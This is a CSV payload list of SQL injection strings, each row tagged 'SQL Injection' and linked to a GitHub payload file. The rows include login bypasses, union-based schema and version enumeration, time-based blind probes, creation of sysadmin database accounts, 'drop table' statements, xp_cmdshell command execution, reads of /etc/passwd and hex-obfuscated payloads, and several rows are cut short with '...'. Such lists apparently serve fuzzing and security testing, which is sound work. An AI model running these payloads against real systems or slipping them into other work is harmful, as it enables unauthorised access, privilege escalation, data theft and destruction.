cve,tag,payload,url
,SQL Injection,create user name identified by pass123 temporary tablespace temp default tablespace users;,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, ; drop table temp --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"exec sp_addlogin 'name' , 'password' --",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection," exec sp_addsrvrolemember 'name' , 'sysadmin' --",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection," insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, grant connect to name; grant resource to name; --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection," insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, or 1=1 --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection, union (select @@version) --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection," union (select NULL, (select @@version)) --",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection," union (select NULL, NULL, (select @@version)) --",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection," union (select NULL, NULL, NULL,  (select @@version)) --",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection," union (select NULL, NULL, NULL, NULL,  (select @@version)) --",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection," union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,1'1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,1 exec sp_ (or exec xp_),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,1 and 1=1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,1' and 1=(select count(*) from tablenames); --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,1 or 1=1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,1' or '1'='1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,)%20or%20('x'='x,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,%20or%201=1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,; execute immediate 'sel' || 'ect us' || 'er',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"benchmark(10000000,MD5(1))#",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,update,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,;waitfor delay '0:0:__TIME__'--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,1) or pg_sleep(__TIME__)--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"||(elt(-3+5,bin(15),ord(10),hex(char(45))))",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"hi"""") or (""""a""""=""""a""",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,delete,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,like,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,""" or sleep(__TIME__)#",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,pg_sleep(__TIME__)--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,*(|(objectclass=*)),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,declare @q nvarchar (200) 0x730065006c00650063 ...,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 0=0 #,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,insert,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,1) or sleep(__TIME__)#,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,) or ('a'='a,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,; exec xp_regread,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,*|,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,@var select @var as var into temp end --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"1)) or benchmark(10000000,MD5(1))#",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,asc,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,(||6),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"a"" or 3=3--""",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,""" or benchmark(10000000,MD5(1))#",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,# from wapiti,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 0=0 --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,1 waitfor delay '0:0:10'--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 'a'='a,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"hi or 1=1 --""",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or a = a,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,UNION ALL SELECT,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,) or sleep(__TIME__)=',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,")) or benchmark(10000000,MD5(1))#",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,hi' or 'a'='a,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,0,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,21%,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,limit,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 1=1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 2 > 1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,""")) or benchmark(10000000,MD5(1))#",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,PRINT,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,hi') or ('a'='a,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 3=3,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,));waitfor delay '0:0:__TIME__'--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,a' waitfor delay '0:0:10'--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"1;(load_file(char(47,101,116,99,47,112,97,115, ...",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or%201=1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,1 or sleep(__TIME__)#,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 1=1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,and 1 in (select var from temp)--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or '7659'='7659,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 'text' = n'text',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 1=1 or ''=',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,declare @s varchar (200) select @s = 0x73656c6 ...,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,exec xp,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,; exec master..xp_cmdshell 'ping 172.10.1.255'--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,3.10E+17,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,""" or pg_sleep(__TIME__)--",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,x' AND email IS NULL; --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,&,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,admin' or ',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 'unusual' = 'unusual',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,//,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,truncate,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"1) or benchmark(10000000,MD5(1))#",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,\x27UNION SELECT,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,declare @s varchar(200) select @s = 0x77616974 ...,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,tz_offset,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,sqlvuln,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"""));waitfor delay '0:0:__TIME__'--",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,||6,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or%201=1 --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,%2A%28%7C%28objectclass%3D%2A%29%29,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or a=a,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,) union select * from information_schema.tables;,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,PRINT @@variable,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or isNULL(1/0) /*,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,26%,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,""" or ""a""=""a",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,(sqlvuln),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,x' AND members.email IS NULL; --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 1=1--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"and 1=( if((load_file(char(110,46,101,120,11 ...",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,0x770061006900740066006F0072002000640065006C00 ...,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,%20'sleep%2050',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,as,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,1)) or pg_sleep(__TIME__)--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,/**/or/**/1/**/=/**/1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,union all select @@version--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,",@variable",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,(sqlattempt2),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or (EXISTS),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,t'exec master..xp_cmdshell 'nslookup www.googl ...,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,%20$(sleep%2050),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"1 or benchmark(10000000,MD5(1))#",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,%20or%20''=',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,||UTL_HTTP.REQUEST,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or pg_sleep(__TIME__)--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,hi' or 'x'='x';,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,""") or sleep(__TIME__)=""",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 'whatever' in ('whatever'),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,; begin declare @var varchar(8000) set @var=' ...,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"union select 1,load_file('/etc/passwd'),1,1,1;",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,0x77616974666F722064656C61792027303A303A313027 ...,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,exec(@s),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,) or pg_sleep(__TIME__)--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,union select,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or sleep(__TIME__)#,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,select * from information_schema.tables--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,a' or 1=1--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,a' or 'a' = 'a,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,declare @s varchar(22) select @s =,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 2 between 1 and 3,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or a=a--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or '1'='1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,|,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or sleep(__TIME__)=',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 1 --',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"or 0=0 #""",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,having,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,a',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,""" or isNULL(1/0) /*",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,declare @s varchar (8000) select @s = 0x73656c ...,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,char%4039%41%2b%40SELECT,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,order by,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,bfilename,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,having 1=1--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,") or benchmark(10000000,MD5(1))#",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or username like char(37);,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,;waitfor delay '0:0:__TIME__'--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,""" or 1=1--",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,x' AND userid IS NULL; --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,*/*,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 'text' > 't',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,(select top 1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"or benchmark(10000000,MD5(1))#",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,""");waitfor delay '0:0:__TIME__'--",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,a' or 3=3--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,-- &password=,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,group by userid having 1=1--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or ''=',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,; exec master..xp_cmdshell,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,%20or%20x=x,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,select,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,""")) or sleep(__TIME__)=""",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,0x730065006c0065006300740020004000400076006500 ...,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,hi' or 1=1 --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,""") or pg_sleep(__TIME__)--",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,%20or%20'x'='x,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 'something' = 'some'+'thing',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,exec sp,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,29%,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,(,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,ÃƒÂ½ or 1=1 --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,1 or pg_sleep(__TIME__)--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,0 or 1=1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,) or (a=a,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,uni/**/on sel/**/ect,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,replace,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,%27%20or%201=1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,)) or pg_sleep(__TIME__)--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,%7C,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,x' AND 1=(SELECT COUNT(*) FROM tabname); --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,&apos;%20OR,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,; or '1'='1',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,declare @q nvarchar (200) select @q = 0x770061 ...,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,1 or 1=1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,; exec ('sel' + 'ect us' + 'er'),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,23 OR 1=1,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,/,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,anything' OR 'x'='x,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,declare @q nvarchar (4000) select @q =,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 0=0 --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,desc,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,||'6,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,),https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,1)) or sleep(__TIME__)#,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,or 0=0 #,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,select name from syscolumns where id = (sele ...,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
